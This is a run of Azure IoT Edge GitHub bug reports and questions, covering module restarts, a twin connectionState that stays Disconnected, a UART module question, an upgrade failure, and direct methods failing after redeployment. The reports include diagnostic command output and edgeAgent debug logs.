<6> 2019-12-03 15:20:38.793 +00:00 [INF] - Executing command: "Command Group: (\n  [Command Group: (\n  [Prepare update module REMOVED BEFORE UPLOAD]\n  [Stop module REMOVED BEFORE UPLOAD]\n  [Update module REMOVED BEFORE UPLOAD]\n)]\n  [Start module REMOVED BEFORE UPLOAD]\n)"
<6> 2019-12-03 15:20:38.794 +00:00 [INF] - Executing command: "Command Group: (\n  [Prepare update module REMOVED BEFORE UPLOAD]\n  [Stop module REMOVED BEFORE UPLOAD]\n  [Update module REMOVED BEFORE UPLOAD]\n)"
<6> 2019-12-03 15:20:44.097 +00:00 [INF] - Executing command: "Start module REMOVED BEFORE UPLOAD"
<6> 2019-12-03 15:20:44.885 +00:00 [INF] - Executing command: "Command Group: (\n  [Command Group: (\n  [Prepare update module REMOVED BEFORE UPLOAD]\n  [Stop module REMOVED BEFORE UPLOAD]\n  [Update module REMOVED BEFORE UPLOAD]\n)]\n  [Start module REMOVED BEFORE UPLOAD]\n)"
<6> 2019-12-03 15:20:44.886 +00:00 [INF] - Executing command: "Command Group: (\n  [Prepare update module REMOVED BEFORE UPLOAD]\n  [Stop module REMOVED BEFORE UPLOAD]\n  [Update module REMOVED BEFORE UPLOAD]\n)"
<6> 2019-12-03 15:20:55.150 +00:00 [INF] - Executing command: "Start module REMOVED BEFORE UPLOAD"
<6> 2019-12-03 15:20:56.982 +00:00 [INF] - Executing command: "Command Group: (\n  [Stop module edgeHub]\n  [Start module edgeHub]\n  [Saving edgeHub to store]\n)"
<6> 2019-12-03 15:20:56.982 +00:00 [INF] - Executing command: "Stop module edgeHub"
<6> 2019-12-03 15:20:56.993 +00:00 [INF] - Executing command: "Start module edgeHub"
<6> 2019-12-03 15:20:59.270 +00:00 [INF] - Executing command: "Saving edgeHub to store"
<6> 2019-12-03 15:20:59.349 +00:00 [INF] - Executing command: "Command Group: (\n  [Stop module EdgeLoggingSpout]\n  [Start module EdgeLoggingSpout]\n  [Saving EdgeLoggingSpout to store]\n)"
<6> 2019-12-03 15:20:59.349 +00:00 [INF] - Executing command: "Stop module EdgeLoggingSpout"
<6> 2019-12-03 15:20:59.370 +00:00 [INF] - Executing command: "Start module EdgeLoggingSpout"
<6> 2019-12-03 15:21:01.222 +00:00 [INF] - Executing command: "Saving EdgeLoggingSpout to store"
<6> 2019-12-03 15:21:01.230 +00:00 [INF] - Plan execution ended for deployment 16
<6> 2019-12-03 15:21:02.204 +00:00 [INF] - Updated reported properties
<6> 2019-12-03 15:21:07.510 +00:00 [INF] - Updated reported properties
<6> 2019-12-03 15:29:14.042 +00:00 [INF] - HealthRestartPlanner is clearing restart stats for module 'EdgeLoggingSpout' as it has been running healthy for 00:10:00.
<6> 2019-12-03 15:29:14.047 +00:00 [INF] - Plan execution started for deployment 16
<6> 2019-12-03 15:29:14.053 +00:00 [INF] - Executing command: "Saving EdgeLoggingSpout to store"
<6> 2019-12-03 15:29:14.055 +00:00 [INF] - Plan execution ended for deployment 16
<6> 2019-12-03 15:29:19.418 +00:00 [INF] - Updated reported properties
<6> 2019-12-03 15:29:24.521 +00:00 [INF] - HealthRestartPlanner is clearing restart stats for module 'edgeHub' as it has been running healthy for 00:10:00.
<6> 2019-12-03 15:29:24.522 +00:00 [INF] - Plan execution started for deployment 16
<6> 2019-12-03 15:29:24.523 +00:00 [INF] - Executing command: "Saving edgeHub to store"
<6> 2019-12-03 15:29:24.523 +00:00 [INF] - Plan execution ended for deployment 16
<6> 2019-12-03 15:29:29.925 +00:00 [INF] - Updated reported properties

```
</details>

<details>
<summary>second observation: docker CPU usage</summary>

![image](https://user-images.githubusercontent.com/32063689/70069361-f29e8c80-15f1-11ea-819e-9a86c9633a6c.png)

</details>

<details>
<summary>docker version</summary>

```

	Client:
	 Version:           3.0.7
	 API version:       1.40
	 Go version:        go1.12.8
	 Git commit:        578ab52e
	 Built:             Wed Oct  2 21:39:40 2019
	 OS/Arch:           linux/arm
	 Experimental:      false
	
	Server:
	 Engine:
	  Version:          3.0.7
	  API version:      1.40 (minimum version 1.12)
	  Go version:       go1.12.8
	  Git commit:       ed20165
	  Built:            Wed Oct  2 23:22:11 2019
	  OS/Arch:          linux/arm
	  Experimental:     false
	 containerd:
	  Version:          v1.2.6
	  GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
	 runc:
	  Version:          1.0.0-rc8
	  GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
	 docker-init:
	  Version:          0.18.0
  GitCommit:        fec3683


```
</details>

## Additional Information
* Network connectivity might be unstable on the testing grounds, but we believe the runtime should be resilient against this, and we have no direct reason to believe that this is the root cause. 
* optimizeForPerformance = false
* possibly related: [1451](https://github.com/Azure/iotedge/issues/1451) and [239](https://github.com/Azure/iotedge/issues/239)

 Open this issue on behalf of @smoms. Here's the words from smoms:
> in the Azure IoT Hub Portal i can see the 2 modules tempSensor and filtermodule but all column status are N/A. And in fact if i click "Set Module" the page is empty. Why is that? thanks

@smos, please help provide more details here if you still have this issue. Thanks. Hi,

I am looking to implement connection state of Edge gateway in device twin to check whether gateway is connected to IotHub or not.

## Expected Behavior
 connectionState should be updated as _Connected_ in Azure Edge device twin

## Current Behavior
 connectionState always showing as _Disconnected_ in Azure Edge device twin but it is working for IoT device in transparent gateway solution


## Context (Environment)

### Device (Host) Operating System
 Ubuntu 16.04 

### Architecture
 amd64 

### Container Operating System
 Linux containers 

### Runtime Versions

#### iotedged
 Run `iotedge version` 1.0.5

#### Edge Agent
 Image tag (i.e. 1.0.5) 

#### Edge Hub
 Image tag (i.e. 1.0.5) 

#### Docker
 Run `docker version` 3.0.2

## Logs
**Edge Device**  _Parent Device_

{
  "deviceId": "EdgeSimulator1",
  "etag": "AAAAAAAAAAE=",
  "deviceEtag": "MTAzNTA4Nzc1Ng==",
  "status": "enabled",
  "statusUpdateTime": "0001-01-01T00:00:00",
  **"connectionState": "Disconnected",**
  "lastActivityTime": "0001-01-01T00:00:00",
  "cloudToDeviceMessageCount": 0,
  "authenticationType": "sas",
  "x509Thumbprint": {
    "primaryThumbprint": null,
    "secondaryThumbprint": null
  }

**IoT Device**  _Leaf Device_

{
  "deviceId": "IoTSimulator1",
  "etag": "AAAAAAAAAAE=",
  "deviceEtag": "MjYwNjIzNDM0",
  "status": "enabled",
  "statusUpdateTime": "0001-01-01T00:00:00",
  **"connectionState": "Connected",**
  "lastActivityTime": "0001-01-01T00:00:00",
  "cloudToDeviceMessageCount": 0,
  "authenticationType": "sas",
  "x509Thumbprint": {
    "primaryThumbprint": null,
    "secondaryThumbprint": null
  }

<img width="1189" alt="screen shot 2019-02-06 at 17 53 23" src="https://user-images.githubusercontent.com/7486266/52341737-6a834100-2a39-11e9-80cb-e06966642872.png">


## Additional Information
<!-- Please provide any additional information that may be helpful in understanding the issue. -->
 Hi,
I have to read data over UART protocol as custom module. Is there any support is available on azure edge in linux or Windows IoT Core?

There is a requirement to implement UART communication as custom module.
 

I have upgraded Azure edge version from 1.0.5 to 1.0.6,  Everything was working fine on older edge version, but module started failing with latest update with 1.0.6



## Context (Environment)

### Device (Host) Operating System
<Ubuntu 16.04>

### Architecture
< amd64 >

### Container Operating System
<Linux containers>

### Runtime Versions

#### iotedged
< Run `iotedge version` 1.0.6 >

#### Edge Agent
< Image tag (i.e. 1.0.6) >

#### Edge Hub
< Image tag (i.e. 1.0.6) >

#### Docker
< Run `docker version` 3.0.2 >



**Please find attached logs of edgeHub, edgeAgent, edgeModule**

[edgeAgent_log_Edge_1.0.6.txt](https://github.com/Azure/iotedge/files/2827850/edgeAgent_log_Edge_1.0.6.txt)
[edgeHub_Log_Edge_1.0.6.txt](https://github.com/Azure/iotedge/files/2827851/edgeHub_Log_Edge_1.0.6.txt)
[Module_Failure_on_Version Edge_1.0.6.txt](https://github.com/Azure/iotedge/files/2827852/Module_Failure_on_Version.Edge_1.0.6.txt)

 <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need Support? Every customer with an active Azure subscription has access to [support](https://docs.microsoft.com/en-us/azure/azure-supportability/how-to-create-azure-support-request) with guaranteed response time.  Consider submitting a ticket and get assistance from the Microsoft support team.
-->

<!--- Provide a general summary of the issue in the Title above -->

## Expected Behavior
When updating a module the direct methods should still work

## Current Behavior
If I update a module by deleting and adding a new module with the same name, the direct methods are not working. After restarting the edgeHub direct methods are working again for this modul

## Steps to Reproduce
<!-- Provide a detailed set of steps to reproduce the bug. -->
1. Deploy module
2. Delete module
3. Deploy new version with same name
4. Send direct method
5. Receive:
```
{"message":"NotFound:{\r\n  \"Message\": \"{\\\"errorCode\\\":404103,\\\"trackingId\\\":\\\"f02692c403b241c0a4370b5587208989-TimeStamp:09/11/2019 15:28:24\\\",\\\"message\\\":\\\"Timed out waiting for device to connect.\\\",\\\"info\\\":{\\\"timeout\\\":\\\"00:00:10\\\"},\\\"timestampUtc\\\":\\\"2019-09-11T15:28:24.636382Z\\\"}\",\r\n  \"ExceptionMessage\": \"\"\r\n}"}
```

## Context (Environment)

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```
sh-3.2# iotedge check
Configuration checks
--------------------
√ config.yaml is well-formed - OK
√ config.yaml has well-formed connection string - OK
√ container engine is installed and functional - OK
√ config.yaml has correct hostname - OK
√ config.yaml has correct URIs for daemon mgmt endpoint - OK
√ latest security daemon - OK
√ host time is close to real time - OK
× container time is close to host time - Error
    Detected time drift between host and container
‼ DNS server - Warning
    Container engine is not configured with DNS server setting, which may impact connectivity to IoT Hub.
    Please see https://aka.ms/iotedge-prod-checklist-dns for best practices.
    You can ignore this warning if you are setting DNS server per module in the Edge deployment.
‼ production readiness: certificates - Warning
    Device is using self-signed, automatically generated certs.
    Please see https://aka.ms/iotedge-prod-checklist-certs for best practices.
√ production readiness: certificates expiry - OK
‼ production readiness: container engine - Warning
    Device is not using a production-supported container engine (moby-engine).
    Please see https://aka.ms/iotedge-prod-checklist-moby for details.
‼ production readiness: logs policy - Warning
    Container engine is not configured to rotate module logs which may cause it run out of disk space.
    Please see https://aka.ms/iotedge-prod-checklist-logs for best practices.
    You can ignore this warning if you are setting log policy per module in the Edge deployment.

Connectivity checks
-------------------
√ host can connect to and perform TLS handshake with IoT Hub AMQP port - OK
√ host can connect to and perform TLS handshake with IoT Hub HTTPS / WebSockets port - OK
√ host can connect to and perform TLS handshake with IoT Hub MQTT port - OK
√ container on the default network can connect to IoT Hub AMQP port - OK
√ container on the default network can connect to IoT Hub HTTPS / WebSockets port - OK
√ container on the default network can connect to IoT Hub MQTT port - OK
√ container on the IoT Edge module network can connect to IoT Hub AMQP port - OK
√ container on the IoT Edge module network can connect to IoT Hub HTTPS / WebSockets port - OK
√ container on the IoT Edge module network can connect to IoT Hub MQTT port - OK
√ Edge Hub can bind to ports on host - OK

18 check(s) succeeded.
4 check(s) raised warnings. Re-run with --verbose for more details.
1 check(s) raised errors. Re-run with --verbose for more details.
```
</details>

### Device (Host) Operating System
```
sh-3.2# uname -a
Linux ntb827eba9f249 4.9.80-rt62 #1 SMP PREEMPT RT Thu Aug 22 11:04:13 UTC 2019 armv7l GNU/Linux
```
### Architecture
```
sh-3.2# uname -m
armv7l
```
### Container Operating System
Linux containers

### Runtime Versions

#### iotedged
```
sh-3.2# iotedge version
iotedge 1.0.8
```

#### Edge Agent
mcr.microsoft.com/azureiotedge-agent:1.0.8.1

#### Edge Hub
mcr.microsoft.com/azureiotedge-hub:1.0.8.1

#### Docker

```
sh-3.2# docker -H unix:///var/run/iotedge-docker.sock version
Client:
 Version:           19.03.2
 API version:       1.40
 Go version:        go1.12.6
 Git commit:        6a30dfca03664a0b6bf0646a7d389ee7d0318e6e
 Built:             Wed Sep  4 10:14:17 2019
 OS/Arch:           linux/arm
 Experimental:      false

Server:
 Engine:
  Version:          19.03.2
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.6
  Git commit:       6a30dfca03664a0b6bf0646a7d389ee7d0318e6e
  Built:            Wed Sep  4 10:15:07 2019
  OS/Arch:          linux/arm
  Experimental:     false
 containerd:
  Version:          v1.2.7.m
  GitCommit:        85f6aa58b8a3170aec9824568f7a31832878b603.m
 runc:
  Version:          1.0.0-rc8
  GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
```

## Logs
<!-- Please share as many logs as possible. This will help debugging -->
<!-- Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information. -->
<!-- Don't forget to remove any connection string information! -->

<details>
<summary>iotedged logs</summary>

```
<Paste here>
```
</details>

<details>
<summary>edge-agent logs</summary>

```
sh-3.2# iotedge logs edgeAgent --tail 200
<7> 2019-09-11 15:29:13.889 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:13.895 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:13.902 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:13.902 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:18.904 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:18.905 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:18.905 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:18.905 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:18.906 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:18.906 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:18.907 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:18.931 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:18.935 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:18.946 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:18.949 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:18.965 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:18.971 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:18.972 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:23.974 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:23.974 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:23.975 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:23.975 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:23.978 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:23.979 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:23.979 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:24.002 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:24.004 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:24.019 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:24.022 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:24.031 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
